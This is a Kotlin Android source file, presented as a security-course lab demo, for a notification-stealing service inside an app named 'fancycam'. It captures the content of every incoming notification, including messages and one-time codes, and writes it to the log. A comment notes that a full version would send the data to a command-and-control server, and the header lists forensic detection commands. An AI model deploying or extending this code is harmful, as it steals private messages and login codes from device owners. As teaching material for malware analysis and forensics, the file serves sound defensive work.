package com.example.fancycam

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Demonstrates how malware uses NotificationListenerService to read
 * all incoming notifications from every app — messages, emails, OTPs, etc.
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Forensic detection:
 *   - adb shell dumpsys notification --noredact
 *   - adb shell settings get secure enabled_notification_listeners
 *   - Look for NotificationListenerService binding in dumpsys activity services
 *
 * Educational note: User must explicitly grant notification access in
 * Settings > Security > Notification access. This is a user-visible
 * permission grant — a key forensic artifact.
 */
class NotificationReaderService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        try {
            val notification = sbn.notification
            val extras: Bundle = notification.extras

            val info = JSONObject()
            info.put("package", sbn.packageName)
            info.put("title", extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "")
            info.put("text", extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "")
            info.put("sub_text", extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: "")
            info.put("info_text", extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: "")
            info.put("big_text", extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: "")
            info.put("progress", extras.getInt(Notification.EXTRA_PROGRESS, -1))
            info.put("progress_max", extras.getInt(Notification.EXTRA_PROGRESS_MAX, -1))
            info.put("timestamp", sbn.postTime)
            info.put("is_ongoing", sbn.isOngoing)

            Log.d(TAG, "[EDUCATIONAL] Notification captured: ${info.toString(2)}")

            // In a full implementation, this would be exfiltrated to C2.
            // For lab purposes, we log to logcat for real-time monitoring.
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Failed to parse notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        sbn ?: return
        Log.d(TAG, "[EDUCATIONAL] Notification removed: ${sbn.packageName}")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i(TAG, "[EDUCATIONAL] Notification listener CONNECTED — all notifications visible")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "[EDUCATIONAL] Notification listener DISCONNECTED")
    }

    companion object {
        private const val TAG = "NotificationReader"
    }
}
